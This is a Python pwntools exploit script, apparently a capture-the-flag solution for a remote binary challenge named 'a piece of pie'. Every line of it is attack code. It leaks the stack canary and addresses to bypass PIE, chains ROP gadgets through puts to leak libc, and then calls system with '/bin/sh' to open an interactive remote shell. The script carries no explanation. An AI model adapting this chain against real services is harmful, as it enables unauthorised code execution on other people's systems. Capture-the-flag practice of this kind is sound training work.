from pwn import *
import time

port = 17440
rem = remote("srv1.kitriwhs.kr", port)


elf = ELF('./WHS/a piece of pie/problem/a_piece_of_pie')
base_to_gadget = elf.symbols["gadget"]
base_to_main = elf.symbols["main"]
base_to_vuln = elf.symbols["vuln"]
puts_plt = elf.plt["puts"]

libc = ELF('./WHS/a piece of pie/problem/libc.so.6')
system = libc.symbols["system"]

payload = b"A" * 0x1
rem.sendafter(b"name: ", payload)

payload = b"A" * 0xa9
rem.sendafter(b"1: ", payload)
rem.recvuntil(payload)
recv = rem.recvline().rstrip()
canary = p64(int(recv[0:7].hex(), 16), endian="big")
rbp = int(recv[7:][::-1].hex(), 16)

payload = b"B" * 0xb8
rem.sendafter(b"2: ", payload)
rem.recvuntil(payload)
recv = rem.recvline().rstrip()
ret_addr = int(recv[0:7][::-1].hex(), 16)
pie_base = ret_addr - 125 - base_to_main

gadget_addr = pie_base + base_to_gadget
vuln_addr = pie_base + base_to_vuln
puts_addr = pie_base + puts_plt

payload = b"C" * 0xa8 + canary + b"D" * 0x8 + p64(gadget_addr) + p64(rbp + 8) + p64(puts_addr) + p64(vuln_addr)
rem.sendafter(b"3: ", payload)

lib_base = int(rem.recvline().rstrip()[::-1].hex(),16) - 128 - 0x29d10
system_addr = lib_base + system
shell_addr = lib_base + list(libc.search(b"/bin/sh"))[0]

rem.sendafter(b"1: ", b"A")
rem.sendafter(b"2: ", b"A")
payload = b"C" * 0xa8 + canary + b"D" * 0x8 + p64(gadget_addr) + p64(shell_addr) + p64(gadget_addr + 5) + p64(system_addr)
rem.sendafter(b"3: ", payload)

rem.interactive()
